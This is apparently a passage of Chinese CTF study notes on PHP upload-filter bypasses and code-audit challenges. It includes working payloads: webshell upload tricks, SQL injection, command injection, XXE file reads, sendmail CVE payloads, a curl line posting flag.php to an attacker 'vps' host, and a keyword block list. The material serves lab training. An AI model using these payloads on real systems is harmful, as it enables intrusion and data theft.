array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 这段代码少了这句话，可以与第六关相同的做法 $file_name = deldot($file_name);//删除文件名末尾的点 pass9$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 仔细观察发现少了这段代码 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA 采用Windows文件流特性绕过 将文件名改为 1.php::$DATA,但是实质上保存的文件还是1.php pass10$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 这一句代码是用来检测末尾是否是.，可以双写绕过。抓包将文件名改为1.php. . （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了 pass11$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 这段代码是将文件名中出现 deny_ext的后缀名替换为空 可以双写绕过，即1.pphphp pass12$is_upload = false; $msg = null; if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125; &#125; 本题与之前的题目有所不同，这题的文件的保存路径是可以控制的 这里用的%00截断，原理如下 www.xxx.com/qq.jpg www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php pass13这题与上题利用的原理相同 但是这里要使用 00的二进制形式 pass14明确说了上传图片木马 function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType; &#125; GIF89a 是GIF图片的文件头 ，是为了绕过gif文件的检查 图片木马的制作 桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马 copy 2.jpg /b + 1.php /a webshell.jpg 代码审计1.in_array//1.php &lt;?php include &#x27;config.php&#x27;; $conn = new mysqli($servername, $username, $password, $dbname); if ($conn-&gt;connect_error) &#123; die(&quot;连接失败: &quot;); &#125; $sql = &quot;SELECT COUNT(*) FROM users&quot;; $whitelist = array(); $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $whitelist = range(1, $row[&#x27;COUNT(*)&#x27;]); &#125; $id = stop_hack($_GET[&#x27;id&#x27;]); $sql = &quot;SELECT * FROM users WHERE id=$id&quot;; if (!in_array($id, $whitelist)) &#123; die(&quot;id $id is not in whitelist.&quot;); &#125; $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); echo &quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;; foreach ($row as $key =&gt; $value) &#123; echo &quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;; echo &quot;&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;; &#125; echo &quot;&lt;/table&gt;&lt;/center&gt;&quot;; &#125; else&#123; die($conn-&gt;error); &#125; ?&gt; 漏洞解析 ： 这一关卡考察的是一个任意文件上传漏洞，而导致这一漏洞的发生则是不安全的使用 in_array() 函数来检测上传的文件名，即上图中的第12行部分。由于该函数并未将第三个参数设置为 true ，这导致攻击者可以通过构造的文件名来绕过服务端的检测，例如文件名为 7shell.php 。因为PHP在使用 in_array() 函数判断时，会将 7shell.php 强制转换成数字7，而数字7在 range(1,24) 数组中，最终绕过 in_array() 函数判断，导致任意文件上传漏洞。 in_array() 漏洞利用的例题如下 //index.php &lt;?php include &#x27;config.php&#x27;; $conn = new mysqli($servername, $username, $password, $dbname); if ($conn-&gt;connect_error) &#123; die(&quot;连接失败: &quot;); &#125; $sql = &quot;SELECT COUNT(*) FROM users&quot;; $whitelist = array(); $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $whitelist = range(1, $row[&#x27;COUNT(*)&#x27;]); &#125; $id = stop_hack($_GET[&#x27;id&#x27;]); $sql = &quot;SELECT * FROM users WHERE id=$id&quot;; if (!in_array($id, $whitelist)) &#123; die(&quot;id $id is not in whitelist.&quot;); &#125; $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); echo &quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;; foreach ($row as $key =&gt; $value) &#123; echo &quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;; echo &quot;&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;; &#125; echo &quot;&lt;/table&gt;&lt;/center&gt;&quot;; &#125; else&#123; die($conn-&gt;error); &#125; ?&gt; //config.php &lt;?php $servername = &quot;localhost&quot;; $username = &quot;fire&quot;; $password = &quot;fire&quot;; $dbname = &quot;day1&quot;; function stop_hack($value)&#123; $pattern = &quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;; $back_list = explode(&quot;|&quot;,$pattern); foreach($back_list as $hack)&#123; if(preg_match(&quot;/$hack/i&quot;, $value)) die(&quot;$hack detected!&quot;); &#125; return $value; &#125; ?&gt; 可以看到网页的功能很简单，就是输入用户id，然后服务器返回用户的信息，但是对id参数使用in_array()函数进行了检查，但是我们可以利用上面提到的漏洞，只要payload的第一个字符在range(1,count(*))的范围之内即可绕过第检查。绕过效果如下 但是有一个stop_hack函数，其过滤了很多sql注入中常用的关键词，导致了很多方法无法使用，其中or被过滤就很麻烦，information_schema中包含or单词，所以常规的注入方法无法使用。 这里可以使用报错注入，使用 make_set()函数实现报错注入。 ?id=1 and updatexml(1,make_set(7,0x7e,(select user()),0x7e),1) 表名，列名无法使用information_shcema，但是如果是为了获取flag的话，可以猜测是在flag表的flag列 最后获取flag的payload ?id=1 and updatexml(1,make_set(7,0x7e,(select flag from flag),0x7e),1) 2.filter_var函数缺陷&lt;?php $url = $_GET[&#x27;url&#x27;]; if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123; $site_info = parse_url($url); if(preg_match(&#x27;/sec-redclub.com$/&#x27;,$site_info[&#x27;host&#x27;]))&#123; exec(&#x27;curl &quot;&#x27;.$site_info[&#x27;host&#x27;].&#x27;&quot;&#x27;, $result); echo &quot;&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info[&#x27;host&#x27;]&#125; successfully!&lt;/h1&gt;&lt;/center&gt; &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;; echo implode(&#x27; &#x27;, $result); &#125; else&#123; die(&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;); &#125; &#125; else&#123; echo &quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt; &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;; &#125; ?&gt; filter_var 代码审计 输入的网址首先经过 filter_var()判断是否符合 uri 格式要求，然后用 parse_url() 提取出其中的 host 部分，拼接到 exec()函数里，而 url 是可控的，明显思路是要利用 exec()来命令执行。 可以使用如下 payload 进入命令执行，引号用来闭合 curl 后面的引号，分号则用来闭 合命令，从而执行 ls 命令，并且由于 parse_url()的解析问题，会把第一个分号后面的 内容当作 host 部分，则绕过了正则匹配检查。 ?url=hello://&quot;;ls;&quot;sec-redclub.com 此时的$site_info[host]的值为&quot;;dir;&quot;sec-redclub.com，那么拼接后的语句 为 curl &quot;&quot;;dir;&quot;sec-redclub.com&quot; 这样当exec执行时就会执行到dir命令，所以就可以列出目录 读取flag ?url=hello://&quot;;more$&#123;IFS&#125;;&quot;sec-redclub.com 3.实例化任意对象漏洞&lt;?php class NotFound&#123; function __construct() &#123; die(&#x27;404&#x27;); &#125; &#125; spl_autoload_register( function ($class)&#123; new NotFound(); &#125; ); $classname = isset($_GET[&#x27;name&#x27;]) ? $_GET[&#x27;name&#x27;] : null; $param = isset($_GET[&#x27;param&#x27;]) ? $_GET[&#x27;param&#x27;] : null; $param2 = isset($_GET[&#x27;param2&#x27;]) ? $_GET[&#x27;param2&#x27;] : null; if(class_exists($classname))&#123; $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.&#x27;=&gt;&#x27;.$value.&#x27;&lt;br&gt;&#x27;; &#125; 这道题目考察的是实例化漏洞结合XXE漏洞。我们在上图第18行处可以看到使用了 class_exists 函数来判断类是否存在，如果不存在的话，就会调用程序中的 __autoload 函数，但是这里没有 __autoload 函数，而是用 spl_autoload_register 注册了一个类似 __autoload 作用的函数，即这里输出404信息。 我们这里直接利用PHP的内置类，先用 GlobIterator 类搜索 flag文件 名字，来看一下PHP手册对 GlobIterator 类的 构造函数的定义： public GlobIterator::__construct ( string $pattern [, int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] ) 首先我们需要知道 flag 在哪个文件中，在 PHP 的内置类中可以用 GlobIterator 类来遍历文件系统，其构造函数的第一个参数为要搜索的文件名，第二个参数为选择文件的哪个 列目录的payload: http://127.0.0.1/homework/php/xxe/index.php?name=GlobIterator&amp;param=./*.php&amp;param2=0 读取flag 方法一： 实例化 SimpleXMLElement类来进行 XXE ?name=SimpleXMLElement&amp;param=&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/f1ag.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2 方法二: 使用 SplFileObject 类直接读取文件 payload ?name=SplFileObject&amp;param=./flag.php&amp;param2=r 4.escapeshellarg与escapeshellcmd使用不当主体上就是一个过滤了后的mail函数执行。mail函数的参数是这样的 bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] ) 由于默认调用的是linux的sendmail函数，所以可以在message中写入恶意代码。接着由additional_parameters 指定额外参数，从而写入在指定目录写入文件。 但是，php的mail函数也在底层默认执行了一层escapeshellcmd()函数，那么显然转义了我们的恶意代码。不过，本题代码还有一处经典的escapeshellarg()。如果escapeshellarg()+escapeshellcmd()搭配使用，将出现特殊字符逃逸的问题。buu上也有一个类似的题目.这里则借用项目里的例子简单介绍下 127.0.0.1&#x27; -v -d a=1 #escapeshellarg &#x27;127.0.0.1&#x27;\\&#x27;&#x27; -v -d a=1&#x27; #escapeshellcmd &#x27;127.0.0.1&#x27;\\\\&#x27;&#x27; -v -d a=1\\&#x27; 此时最后一步可以看出，\\\\将被解释为\\不再起到转义的作用，而是作为换行符。因此payload变为先是127.0.0.1，再-v -d-d对应的数据为a=1&#39;. 比如CVE-2016-10033 跟CVE-2016-10045的两个payload a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com a&#x27;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com 前者没有escapeshellcmd直接打。后者escapeshellcmd后又加了一层escapeshellarg导致字符逃逸。 源码如下，对其进行了注释 &lt;?php highlight_file(&#39;index.php&#39;); function waf($a)&#123; foreach($a as $key &#x3D;&gt; $value)&#123; if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123;&#x2F;&#x2F;遍历所有键，不能出现flag字样 exit(&#39;are you a hacker&#39;); &#125; &#125; &#125; foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;&#x2F;&#x2F;遍历所有以post，get，cookie方式提交的数据， if($$__R) &#123; &#x2F;&#x2F;例如$flag&#x3D;a,$$flag--&gt;$a,一个新变量 foreach($$__R as $__k &#x3D;&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); &#x2F;&#x2F;若之前有这个变量并且键和值相等，就删除这个变量 &#125; &#125; &#125; if($_POST) &#123; waf($_POST);&#125; if($_GET) &#123; waf($_GET); &#125; if($_COOKIE) &#123; waf($_COOKIE);&#125; if($_POST) extract($_POST, EXTR_SKIP);&#x2F;&#x2F;将键名变成变量名，如果传入flag，应该是设置了_GET[&#39;flag&#39;]这个变量 if($_GET) extract($_GET, EXTR_SKIP); if(isset($_GET[&#39;flag&#39;]))&#123;&#x2F;&#x2F;必须设置以get方式传参的flag..这个可以用 if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;hongri&#39;])&#123; exit(&#39;error&#39;); &#125; if(md5($_GET[&#39;flag&#39;] ) &#x3D;&#x3D; md5($_GET[&#39;hongri&#39;]))&#123;&#x2F;&#x2F;数组或碰撞 echo &quot;success!&quot;; $url &#x3D; $_GET[&#39;url&#39;]; $urlInfo &#x3D; parse_url($url); if(!(&quot;http&quot; &#x3D;&#x3D;&#x3D; strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;&#x3D;&#x3D;&#x3D;strtolower($urlInfo[&quot;scheme&quot;])))&#123; die( &quot;scheme error!&quot;); &#125; $url &#x3D; escapeshellarg($url); $url &#x3D; escapeshellcmd($url);&#x2F;&#x2F;特殊字符逃逸 system(&quot;curl &quot;.$url); &#125; &#125; ?&gt; 很明显的变量覆盖，之后要绕过waf。再接下来就是escapeshellsmd/arg的搭配进行命令执行了。首先要解决的是，我们必须绕过preg_match的限制才能传入flag变量。因此要利用好它写好的这个功能。 首先这里利用了可变变量的特性。假设我们提交 ?flag=test post:_GET[flag]=test 当开始遍历 $_POST 超全局数组的时候， $__k 代表 _GET[flag] ，所以 $$__k就是 $_GET[flag] ，即 test 值，此时 $$__k == $__v 成立，变量 $_GET[flag] 就被 unset 了 而接下来下面又有一个变量覆盖if($_POST) extract($_POST, EXTR_SKIP);所以直接得到$_GET[flag]=test绕过第一层 第二层只需利用0e的MD5弱类型比较最后是curl的命令执行http://baidu.com/&#39; -F file=@/var/www/html/flag.php -x vps:9999似乎当curl版本变高后，将不再能执行。curl &#39;127.0.0.1&#39;\\&#39;&#39; 5.preg_match函数漏洞// index.php &lt;?php include &#x27;flag.php&#x27;; if (&quot;POST&quot; == $_SERVER[&#x27;REQUEST_METHOD&#x27;]) &#123; $password = $_POST[&#x27;password&#x27;]; if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;, $password)) &#123; echo &#x27;Wrong Format&#x27;; exit; &#125; while (TRUE) &#123; $reg = &#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array(&#x27;punct&#x27;, &#x27;digit&#x27;, &#x27;upper&#x27;, &#x27;lower&#x27;); foreach ($ps as $pt) &#123; if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; &#125; if ($c &lt; 3) break; if (&quot;42&quot; == $password) echo $flag; else echo &#x27;Wrong password&#x27;; exit; &#125; &#125; highlight_file(__FILE__); ?&gt; 字符类的含义是 graph 空格以外的可打印字符 punct 打印字符，不包括字母数字 主要函数里，第一个正则表示匹配到可打印字符12个以上;第二个正则表示把连续的符号、数字、大写、小写，作为一段，至少分六段;第三个正则表示输入的字符串至少含有符号、数字、大写、小写中的三种类型。 最后与数字进行弱类型比较。payload 42.00e+00000 第一种方法 http://127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();// http://127.0.0.1/index.php?option=a 第一个payload写入内容后只有一个单引号被转义的问题。而第二部分再传入一个a时就会因为.*匹配无数次而把\\换掉 还有两种preg_replace的方法、这里提下第二种，也就是还适用于单行(非贪婪)模式的payload。之前安恒的套娃web2里出现过。 http://127.0.0.1/test/ph.php?option=;phpinfo(); http://127.0.0.1/test/ph.php?option=$0 其最后的效果是下面这样的 &lt;?php $option=&#x27;$option=&#x27;;phpinfo();&#x27;;&#x27;; 6.parse_str函数缺陷漏洞代码 function getUser($id) &#123; global $config, $db; if (!is_resource($db)) &#123; $db = new MySQLi( $config[&#x27;dbhost&#x27;], $config[&#x27;dbuser&#x27;], $config[&#x27;dbpass&#x27;], $config[&#x27;dbname&#x27;] ); &#125; $sql = &quot;SELECT username FROM users WHERE id = ?&quot;; $stmt = $db-&gt;prepare($sql); $stmt-&gt;bind_param(&#x27;i&#x27;, $id); $stmt-&gt;bind_result($name); $stmt-&gt;execute(); $stmt-&gt;fetch(); return $name; &#125; $var = parse_url($_SERVER[&#x27;HTTP_REFERER&#x27;]); parse_str($var[&#x27;query&#x27;]); $currentUser = getUser($id); echo &#x27;&lt;h1&gt;&#x27;.htmlspecialchars($currentUser).&#x27;&lt;/h1&gt;&#x27;; 漏洞解析 parse_str 先来看看定义： parse_str功能 ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。 定义 ：void parse_str( string $encoded_string [, array &amp;$result ] ) 如果 encoded_string 是 URL 传入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ） 看了定义我们也能很快感受到它的漏洞点就是变量覆盖了。 PHP $_SERVER[‘HTTP_REFERER’] PHP $_SERVER[&#39;HTTP_REFERER&#39;]，它是获取当前页面的url。需要注意的是，$_SERVER[‘HTTP_REFERER’]完全来源于浏览器。并不是所有的用户代理（浏览器）都会设置这个变量，而且有的还可以手工修改 HTTP_REFERER。因此，$_SERVER[‘HTTP_REFERER’] 是可以伪造的。$_SERVER[‘HTTP_REFERER’]对 POST 表单访问也是有效的我们想办法提交类似 config[dbhost]=127.0.0.1 这样类型的数据，这样因此我们可以控制连接的数据库，导致网站出现错误显示。 CTF题目 index.php //index.php &lt;?php $a = “hongri”; $id = $_GET[&#x27;id&#x27;]; @parse_str($id); if ($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;)) &#123; echo &#x27;&lt;a href=&quot;upload.php&quot;&gt;flag is here&lt;/a&gt;&#x27;; &#125; ?&gt; upload.php &lt;?php header(&quot;Content-type:text/html;charset=utf-8&quot;); $referer = $_SERVER[&#x27;HTTP_REFERER&#x27;]; if(isset($referer)!== false) &#123; $savepath = &quot;uploads/&quot; . sha1($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &quot;/&quot;; if (!is_dir($savepath)) &#123; $oldmask = umask(0); mkdir($savepath, 0777, true); umask($oldmask); &#125; if ((@$_GET[&#x27;filename&#x27;]) &amp;&amp; (@$_GET[&#x27;content&#x27;])) &#123; //$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;); $content = &#x27;HRCTF&#123;y0u_n4ed_f4st&#125; by:l1nk3r&#x27;; file_put_contents(&quot;$savepath&quot; . $_GET[&#x27;filename&#x27;], $content); $msg = &#x27;Flag is here,come on~ &#x27; . $savepath . htmlspecialchars($_GET[&#x27;filename&#x27;]) . &quot;&quot;; echo $msg; usleep(100000); $content = &quot;Too slow!&quot;; file_put_contents(&quot;$savepath&quot; . $_GET[&#x27;filename&#x27;], $content); &#125; print &lt;&lt;&lt;EOT &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;exampleInputEmail1&quot;&gt;Filename&lt;/label&gt; &lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;filename&quot; id=&quot;exampleInputEmail1&quot; placeholder=&quot;Filename&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;exampleInputPassword1&quot;&gt;Content&lt;/label&gt; &lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;content&quot; id=&quot;exampleInputPassword1&quot; placeholder=&quot;Contont&quot;&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Submit&lt;/button&gt; &lt;/form&gt; EOT; &#125; else&#123; echo &#x27;you can not see this page&#x27;; &#125; 第一关 在index.php内有如下; $id = $_GET[&#x27;id&#x27;]; @parse_str($id); if ($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;)) &#123; echo &#x27;&lt;a href=&quot;upload.php&quot;&gt;flag is here&lt;/a&gt;&#x27;; 可想而知我们需要用变量覆盖，payload为： ?id=a[0]=s878926199a 